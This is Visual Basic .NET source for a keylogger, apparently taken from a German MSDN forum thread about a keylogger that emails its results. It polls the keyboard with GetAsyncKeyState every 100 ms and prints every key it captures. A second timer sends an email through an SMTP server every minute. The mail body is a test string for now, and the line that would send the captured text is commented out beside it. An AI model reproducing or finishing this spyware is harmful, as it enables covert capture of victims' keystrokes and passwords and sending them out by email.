'https://social.msdn.microsoft.com/Forums/de-DE/f5684a80-057e-4f04-aca1-0586f9bd3364/visual-basic-2010-express-keylogger-der-mich-eine-email-sendet-email-sieht-aber-komisch-aus?forum=vsexpressde
Imports System.Web
Imports System.IO
Imports System.Net.Mail
'Imports System.Windows.Forms
Imports System.Timers



Module Module1
    Dim result As Integer
    'Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Dim WithEvents Timer1 As New System.Timers.Timer
    Dim WithEvents Timer2 As New System.Timers.Timer

    Declare Function GetAsyncKeyState Lib "user32" (ByVal key As Integer) As Short '

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Elapsed
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                Console.Write(Chr(i))
                'TextBox1.Text = TextBox1.Text + Chr(i)
            End If
        Next i
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Elapsed
        Dim mail As New MailMessage()
        Dim SmtpServer As New SmtpClient
        SmtpServer.Credentials = New Net.NetworkCredential("Meine Email Adresse", "Mein Passwort")
        SmtpServer.Port = 465 '587
        SmtpServer.Host = "smtp.1und1.de"
        SmtpServer.EnableSsl = True
        SmtpServer.EnableSsl = True
        mail.To.Add("Meine Email Adresse")
        mail.From = New MailAddress("Meine Email Adresse")
        mail.Subject = "Beliebig"
        mail.Body = "hallo das ist ein Test" 'TextBox1.Text
        SmtpServer.Send(mail)
    End Sub

    Sub Main()
        Timer1.AutoReset = True
        Timer1.Interval = 100 '100 milli seconds
        AddHandler Timer1.Elapsed, AddressOf Timer1_Tick
        Timer1.Start()

        Timer2.AutoReset = True
        Timer2.Interval = 60000 '60 seconds
        AddHandler Timer2.Elapsed, AddressOf Timer2_Tick
        Timer2.Start()

        Console.ReadKey()
    End Sub

End Module
